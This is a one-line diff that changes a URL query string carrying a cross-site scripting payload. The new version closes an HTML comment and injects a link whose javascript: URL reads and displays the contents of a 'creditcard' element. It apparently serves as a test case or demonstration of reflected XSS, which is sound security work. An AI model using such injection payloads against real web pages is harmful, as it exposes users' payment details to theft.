@@ -1,1 +1,1 @@
-?creditcard=4564654654&id=<a href=javascript:alert(document.getElementById('creditcard').innerHTML);>Buy</a>
+?creditcard=4564654654&id=--><a href=javascript:alert(document.getElementById('creditcard').innerHTML);>Buy</a><!--
